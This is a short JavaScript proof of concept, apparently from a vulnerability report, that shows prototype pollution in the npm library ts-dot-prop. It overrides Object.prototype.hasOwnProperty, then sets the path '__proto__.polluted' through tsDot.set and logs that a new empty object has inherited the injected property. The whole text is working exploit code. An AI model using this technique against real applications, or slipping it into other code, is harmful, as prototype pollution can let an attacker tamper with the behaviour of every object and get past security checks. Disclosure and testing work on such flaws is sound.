Object.prototype.hasOwnProperty = () => true;
const tsDot = require('ts-dot-prop');
let obj = {};
console.log({}.polluted);
tsDot.set(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);